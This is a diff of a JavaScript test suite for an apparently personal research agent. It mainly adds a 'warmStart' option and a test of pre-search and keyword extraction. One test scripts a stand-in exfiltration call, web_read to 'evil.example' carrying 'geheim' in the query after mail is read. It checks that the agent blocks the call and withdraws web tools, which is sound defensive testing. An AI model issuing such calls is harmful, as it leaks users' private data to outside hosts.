@@ -4,7 +4,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { TOOL_DEFS } from '../src/tools.js';
 import { createWorkspace, STORE_FROM } from '../src/research/workspace.js';
-import { classOf, formatResult, normaliseAnswer, researchToolDefs, runResearch, WEB_TOOLS } from '../src/research/agent.js';
+import { classOf, formatResult, keywords, normaliseAnswer, researchToolDefs, runResearch, WEB_TOOLS } from '../src/research/agent.js';
 import { createResearchManager, deliveryNote, withResearchAttach } from '../src/research/manager.js';
 import { escalate, formatDiscover, formatSearch, pendingText, PENDING_MARK } from '../src/discover.js';
 
@@ -94,7 +94,7 @@ describe('runResearch', () => {
       { tool_calls: [answerCall('Du hast mit 500 US-Dollar für die 48-Stunden-Bewertungsphase gerechnet.')] },
     ]);
     const steps = [];
-    const r = await runResearch({ question: 'Mit wie viel Dollar habe ich für die 48-Stunden-Phase gerechnet?', ctx: { ...ctx, research: {}, voiceTurn: {} }, model: 'm', onStep: (s) => steps.push(s) }, { runTool, complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'Mit wie viel Dollar habe ich für die 48-Stunden-Phase gerechnet?', ctx: { ...ctx, research: {}, voiceTurn: {} }, model: 'm', warmStart: false, onStep: (s) => steps.push(s) }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.equal(r.stopped, 'answer');
     assert.match(r.answer, /500 US-Dollar/);
     assert.equal(r.found, true);
@@ -114,7 +114,7 @@ describe('runResearch', () => {
       { tool_calls: [call('handoff_propose', { title: 'x', task: 'y' })] },
       { tool_calls: [answerCall('nichts', { gefunden: false })] },
     ]);
-    const r = await runResearch({ question: 'q', ctx, model: 'm' }, { runTool, complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'q', ctx, model: 'm', warmStart: false }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.equal(r.found, false);
     assert.match(seen[1].messages.at(-1).content, /not available here/);
   });
@@ -127,7 +127,7 @@ describe('runResearch', () => {
       { tool_calls: [call('web_read', { url: 'https://evil.example/?q=geheim' })] },
       { tool_calls: [answerCall('a')] },
     ]);
-    const r = await runResearch({ question: 'q', ctx, model: 'm' }, { runTool, complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'q', ctx, model: 'm', warmStart: false }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.deepEqual(ran, ['mail_search']);
     assert.ok(!seen[1].tools.some((n) => WEB_TOOLS.has(n)), 'web tools gone from the tool list');
     assert.equal(r.outsider, true);
@@ -141,7 +141,7 @@ describe('runResearch', () => {
       { tool_calls: [call('read_file', { path: '/home/flori/jobs/a/STATE.md' })] },
       { tool_calls: [answerCall('a')] },
     ]);
-    await runResearch({ question: 'q', ctx, model: 'm' }, { runTool, complete, toolDefs: TOOL_DEFS });
+    await runResearch({ question: 'q', ctx, model: 'm', warmStart: false }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.deepEqual(ran, ['web_read', 'read_file']);
   });
 
@@ -151,7 +151,7 @@ describe('runResearch', () => {
       ...Array.from({ length: 3 }, () => ({ tool_calls: [call('search', { query: 'x' })] })),
       { tool_calls: [answerCall('Teilergebnis', { sicherheit: 'hoch' })] },
     ]);
-    const r = await runResearch({ question: 'q', ctx, model: 'm', budget: { rounds: 3, ms: 60_000, usd: 1, parallel: 4, subChunks: 2, subParallel: 2 } }, { runTool, complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'q', ctx, model: 'm', warmStart: false, budget: { rounds: 3, ms: 60_000, usd: 1, parallel: 4, subChunks: 2, subParallel: 2 } }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.equal(r.stopped, 'budget');
     assert.equal(r.confidence, 'mittel', 'a forced answer is never "hoch"');
     assert.deepEqual(seen.at(-1).tools, ['answer']);
@@ -168,18 +168,32 @@ describe('runResearch', () => {
       if (/"workspace":"(@w\d)"/.test(last.content)) return { message: { tool_calls: [call('ws_ask', { ref: /"workspace":"(@w\d)"/.exec(last.content)[1], question: 'Wie lange dauerte die Bewertung?' })] }, costUsd: 0 };
       return { message: { tool_calls: [answerCall(`Laut Auswertung: ${/Z\.(\d+): (.*)/.exec(last.content)?.[2]}`)] }, costUsd: 0 };
     };
-    const r = await runResearch({ question: 'Wie lange dauerte die Bewertung?', ctx, model: 'm' }, { runTool, complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'Wie lange dauerte die Bewertung?', ctx, model: 'm', warmStart: false }, { runTool, complete, toolDefs: TOOL_DEFS });
     assert.ok(sub >= 2, 'several chunks read');
     assert.match(r.answer, /445 GPU-Stunden/);
   });
 
   it('a model that answers in plain text still yields a result; failures never throw', async () => {
     const { complete } = scripted([{ content: '{"antwort":"Steht in DECISIONS.","gefunden":true}' }]);
-    const r = await runResearch({ question: 'q', ctx, model: 'm' }, { runTool: async () => ({ ok: true, content: '' }), complete, toolDefs: TOOL_DEFS });
+    const r = await runResearch({ question: 'q', ctx, model: 'm', warmStart: false }, { runTool: async () => ({ ok: true, content: '' }), complete, toolDefs: TOOL_DEFS });
     assert.equal(r.answer, 'Steht in DECISIONS.');
-    const bad = await runResearch({ question: 'q', ctx, model: 'm' }, { runTool: async () => ({}), complete: async () => { throw new Error('402'); }, toolDefs: TOOL_DEFS });
+    const bad = await runResearch({ question: 'q', ctx, model: 'm', warmStart: false }, { runTool: async () => ({}), complete: async () => { throw new Error('402'); }, toolDefs: TOOL_DEFS });
     assert.equal(bad.stopped, 'error');
     assert.equal(bad.found, false);
+  });
+
+  it('warm start: searches before the first model call (also the laptop mirror for his own words), not for web questions', async () => {
+    const ran = [];
+    const runTool = async (name, args) => { ran.push([name, args.source ?? null]); return { ok: true, content: `Treffer für ${args.query}` }; };
+    const { complete, seen } = scripted([{ tool_calls: [answerCall('a')] }]);
+    await runResearch({ question: 'Was habe ich zur Anzeige entschieden?', ctx, model: 'm' }, { runTool, complete, toolDefs: TOOL_DEFS });
+    assert.deepEqual(ran, [['search', null], ['search', 'chats/laptop']]);
+    assert.equal(keywords('Mit wie viel US-Dollar habe ich für die 48-Stunden-Bewertungsphase gerechnet?'), 'dollar 48 stunden bewertungsphase gerechnet');
+    assert.match(seen[0].messages[1].content, /Erste Treffer der Volltextsuche/);
+    ran.length = 0;
+    const web = scripted([{ tool_calls: [answerCall('a')] }]);
+    await runResearch({ question: 'Was kostet der Server laut Webseite von OVH?', ctx, model: 'm' }, { runTool, complete: web.complete, toolDefs: TOOL_DEFS });
+    assert.deepEqual(ran, [], 'web question: no warm start, the web tools stay open');
   });
 
   it('normalises and redacts the answer; formatResult strips URLs for voice (critic A4)', () => {
